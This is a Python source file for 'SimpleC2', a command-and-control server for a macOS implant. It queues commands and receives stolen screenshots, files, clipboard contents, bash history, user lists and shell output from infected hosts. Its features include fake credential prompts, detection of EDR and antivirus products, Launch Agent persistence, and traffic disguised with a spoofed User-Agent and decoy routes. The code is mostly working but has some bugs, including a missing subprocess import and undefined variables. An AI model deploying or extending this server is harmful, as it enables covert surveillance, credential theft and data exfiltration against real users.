from aiohttp import web
from datetime import datetime


cmds = {}

print("\033[1;36m+=====================================================================+")
print("SimpleC2 Server")
print("01010011 01101001 01101101 01110000 01101100 01100101 01000011 00110010")
print("+=====================================================================+\033[0m")

async def InitCall(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()
        
async def CheckIn(request):
    cmds.clear()
    peername = request.transport.get_extra_info('peername')
    host, port = peername
    cmdcounter = 0
    count2 = 0
    text = "OK"
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        while True:
            command = input("\033[34m[Source: %s]>>>\033[0m " % str(peername))
            if 'help' in command:
                print("-"*100)
                print("\033[33mHelp menu:\033[0m")
                print("--->ALIASES<---")
                print(">\033[33msysteminfo\033[0m: Return useful system information")
                print(">\033[33mcd [directory]\033[0m: cd to the directory specified (ex: cd /home)")
                print(">\033[33mlistdir\033[0m: list files and directories")
                print(">\033[33mdownload [filename]\033[0m: after you cd to directory of interest, download files of interest (one at a time)")
                print(">\033[33mlistusers\033[0m: List users")
                print(">\033[33maddresses\033[0m: List internal address(es) for this host")
                print(">\033[33mlcwd: Show current server working directory")
                print(">\033[33mpwd: Show working directory on host")
                print('')
                print("--->COMMANDS<---")
                print(">\033[33mprompt\033[0m: Propmpt the user to enter credentials")
                print(">\033[33muserhist\033[0m: Grep for interesting hosts from bash history")
                print(">\033[33mclipboard\033[0m: Grab text in the user's clipboard")
                print(">\033[33mconnections\033[0m: Show active network connections")
                print(">\033[33mchecksecurity\033[0m: Search for common EDR products")
                print(">\033[33mscreenshot\033[0m: Grap a screenshot of the OSX host")
                print(">\033[33msleep [digit]\033[0m: Change sleep time")
                print(">\033[33mpersist\033[0m: Add persistence as OSX Launch Agent. NOTE: This command must be run in the same directory where the macshell client is running.")
                print(">\033[33munpersist\033[0m: Remove the login persistence")
                print(">\033[33mshell [shell command]\033[0m: Run a shell command...NOT OPSEC SAFE, as this uses easily detectable command line strings")
                print('')
                print("--->OTHER<---")
                print(">\033[33mIn general enter whatever Mac OS shell command you want to run. Ex: whoami, hostname, pwd, etc.\033[0m")
                print(">\033[33mexit\033[0m: Exit the session and stop the client")
                print("-"*100)

            elif 'exit' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'lcwd' in command:
                x = subprocess.getstatusoutput("pwd")
                print("Current server working directory:")
                print(str(x).replace("(0, '", '').replace("')",''))
            
            elif (('pwd' in command) and ('shell' not in command)):
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif (('cat' in command) and ('shell' not in command)):
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                    
            elif 'listdir' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

            elif 'whoami' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'connections' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif (('cd ' in command) and ('shell' not in command)):
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'addresses' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'listusers' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'userhist' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                                    
            elif 'screenshot' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

            elif 'download ' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
        
            elif 'checksecurity' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'persist' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'unpersist' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'prompt' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'systeminfo' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'clipboard' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif 'shell ' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)

            elif 'sleep ' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
            
            elif command == 'done':
                datalist = list(cmds.values())
                return web.json_response(datalist)
                break
            else:
                print("[-] Command not found")

        return web.Response(text=text)
    else:
        return web.HTTPNotFound()


async def GetScreenshot(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        sdata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        tstamp = datetime.now()
        with open("screenshot%s.jpg" % str(tstamp), 'wb') as sshot:
            sshot.write(sdata)
            sshot.close()
            print("[+] Screenshot saved to current directory")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def GetDownload(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        ddata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        with open("download%s" % str(timestamp), 'wb') as file:
            file.write(ddata)
            file.close()
            print("[+] File download complete")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def GetPath(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        path = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("[+] Current directory path: %s" % str(path))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ChangeDir(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        pathinfo = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("[+] %s" % str(pathinfo))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ListDir(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        listinfo = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("[+]Results:\n%s" % str(listinfo))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Clipboard(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        clipinfo = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        with open("clipdata%s.txt" % str(timestmp), 'wb') as clip:
            clip.write(clipinfo)
            clip.close()
            print("[+] Clipboard content downloaded in current directory.")
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Prompt(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        promptdata = await request.read()
        print("[+] %s" % str(promptdata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ConnData(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        conndata = await request.read()
        print("[+] %s" % str(conndata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Addresses(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        addressdata = await request.read()
        print("[+] %s" % str(addressdata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ListUsers(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        userdata = await request.read()
        print("[+] Local User Accounts Found:\n%s" % str(userdata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def UserHist(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        histdata = await request.read()
        print("[+] Bash History Data:\r%s" % str(histdata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def CheckSecurity(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        secdata = await request.read()
        b = 0

        if 'CbOsxSensorService' in str(secdata):
            print('[+] \033[33mCarbon Black OSX Sensor installed\033[0m')
            b = 1
                
        if 'CbDefense' in str(secdata):
            print('[+] \033[33mCarbon Black Defense A/V installed\033[0m')
            b = 1
                
        if ('ESET' in str(secdata) or '/eset' in str(secdata)):
            print('[+] \033[33mESET A/V installed\033[0m')
            b = 1
                
        if ('Littlesnitch' in str(secdata) or 'Snitch' in str(secdata)):
            print('[+] \033[33mLittle snitch firewall running\033[0m')
            b = 1
                
        if 'xagt' in str(secdata):
            print('[+] \033[33mFireEye HX agent installed\033[0m')
            b = 1
                
        if 'falconctl' in str(secdata):
            print('[+] \033[33mCrowdstrike Falcon agent installed\033[0m')
            b = 1

        if ('GlobalProtect' in str(secdata) or '/PanGPS' in str(secdata)):
            print('[+] \033[33mGlobal Protect PAN VPN client running\033[0m')
            b = 1

        if 'OpenDNS' in str(secdata):
            print('[+] \033[33mOpenDNS Client running\033[0m')
            b = 1

        if 'HostChecker' in str(secdata):
            print('[+] \033[33mPulse VPN client running\033[0m')
            b = 1

        if b == 0:
            print('[-] No security products found.')

        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Whoami(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        wdata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("[+] Current user identity: %s" % str(wdata.decode('utf8')))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def SysInfo(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        sysinfodata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("[+] Basic system info:\r%s" % str(sysinfodata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def CatFile(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        catdata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("[+] File Content:\r%s" % str(catdata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def ShellCmd(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        cmddata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestmp))
        print("[+] Shell Command Results:\r%s" % str(cmddata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Sleeper(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        sleepdata = await request.read()
        print("[+] %s" % str(sleepdata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def Persist(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        returndata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestamp))
        print("[+] %s" % str(returndata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

async def UnPersist(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        returndata = await request.read()
        timestmp = datetime.now()
        print("Timestamp: %s" % str(timestamp))
        print("[+] %s" % str(returndata))
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()

app = web.Application()
app.add_routes([web.get('/initializee/sequence/0', InitCall),
                web.get('/validate/status', CheckIn),
                web.post('/validatiion/profile/1', GetScreenshot),
                web.post('/validatiion/profile/2', GetDownload),
                web.post('/validatiion/profile/3', GetPath),
                web.post('/validatiion/profile/4', ChangeDir),
                web.post('/validatiion/profile/5', ListDir),
                web.post('/validatiion/profile/6', Clipboard),
                web.post('/validatiion/profile/7', Prompt),
                web.post('/validatiion/profile/8', ConnData),
                web.post('/validatiion/profile/9', Addresses),
                web.post('/validatiion/profile/10', ListUsers),
                web.post('/validatiion/profile/11', UserHist),
                web.post('/validatiion/profile/12', CheckSecurity),
                web.post('/validatiion/profile/13', Whoami),
                web.post('/validatiion/profile/14', SysInfo),
                web.post('/validatiion/profile/15', CatFile),
                web.post('/validatiion/profile/16', ShellCmd),
                web.post('/validatiion/profile/17', Sleeper),
                web.post('/validatiion/profile/18', Persist),
                web.post('/validatiion/profile/19', UnPersist)])

if __name__ == '__main__':
    web.run_app(app)
